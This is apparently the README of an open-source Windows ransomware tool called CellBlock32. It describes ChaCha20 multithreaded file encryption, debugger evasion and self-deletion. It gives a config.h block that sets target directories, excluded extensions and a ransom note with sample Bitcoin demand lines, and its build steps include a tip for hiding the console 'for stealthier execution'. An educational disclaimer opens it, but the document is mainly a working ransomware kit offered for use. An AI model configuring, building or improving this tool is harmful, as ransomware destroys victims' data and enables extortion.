# CellBlock32

> 🚨 **DISCLAIMER:**  
> This tool is provided **solely** for educational, research, and defensive-security purposes.  
> Do **not** run CellBlock32 against any system you do not own or have **explicit** permission to test.  
> Unauthorized or malicious use is **illegal** and the authors disclaim any liability for damages or legal consequences arising from misuse.

[![cellblock32.png](https://i.postimg.cc/C11DjDjx/cellblock32.png)](https://postimg.cc/CZ3z0RP3)

CellBlock32 is a customizable ransomware for Windows. Built without the C runtime (CRT), its binary size stays under 15KB while retaining functionality like multithreading, debugger evasion, and self-deletion.

---

### Features

- ChaCha20 stream cipher
- Recursive, multithreaded file encryption
- Customizable ransom note dropped post-encryption
- Debugger detection and process termination
- Optional self-deletion after execution

---

### Configuration

Customize behavior by editing the macros in `config.h` before compiling:

```c
/*----------------------------------------------------------------------------------------------*/


#define ENCRYPT_EXT_W      L".pwned"    // Encrypted file extension



#define SIGNATURE          0x646e7770   //  Magic bytes for encrypted files ('pwnd')



//#define DECRYPTOR         // Uncomment to build as decryptor



#define RANSOM_MODE         // Drop ransom note



#define SILENT_MODE         // Suppress all STDOUT



#define DEBUGGER_EVASION    // Exit if debugger is detected



#define SELF_DELETION       // Self-delete after execution



#define CONFIG_TARGET_DIRS \            // Directories to recursively encrypt or decrypt
    L"C:\\Users\\Public", \
    NULL 



#define CONFIG_BLACKLISTED_EXTS \       // File extensions to exclude from processing
    ENCRYPT_EXT_W,               \
    L".exe", L".dll", L".sys", L".msi", \
    NULL



#define CONFIG_RANSOM_NOTE \                   
    "YOUR FILES HAVE BEEN ENCRYPTED!\r\n"  \
//  "This is not a joke. Want your data restored?\r\n"  \
//  "Send 0.5 BTC to the address below:\r\n"    \
//  "1MockBTCAddrxxxxxxxxxxxxxxxxxx\r\n"    \
//  "You have 48 hours.\r\n"    \

/*----------------------------------------------------------------------------------------------*/
```

---

### Usage

No command-line arguments required. CellBlock32 will begin encrypting or decrypting files recursively from the path defined in `config.h`. Once complete, it will drop a ransom note and self-delete.

```powershell
.\CellBlock32.exe
```


---

### Build

**Visual Studio**  
1. Open `CellBlock32.sln` in Visual Studio  
2. Set **Configuration** to `Release` and **Platform** to `x64`  
3. Go to **Project → Properties** and configure:  
   - **C/C++ → Code Generation → Runtime Library:** `Multi-threaded (/MT)`  
   - **C/C++ → Code Generation → Enable C++ Exceptions:** `No`  
   - **C/C++ → Code Generation → Security Check:** `Disable Security Check (/GS-)`
   - **C/C++ → Code Generation → Basic Runtime Checks:** `Default`  
   - **C/C++ → General → SDL checks:** `No (/sdl-)`  
   - **C/C++ → Optimization → Whole Program Optimization:** `No` 
   - **Linker → Debugging → Generate Debug Info:** `No`  
   - **Linker → Manifest File → Generate Manifest:** `No`  
   - **Linker → Input → Ignore All Default Libraries:** `Yes (/NODEFAULTLIB)`  
   - **Linker → Advanced → Entry Point:** `main`  
   - **Linker → System → Subsystem:** `Console` (use `Windows` for stealthier execution — it hides the console window)



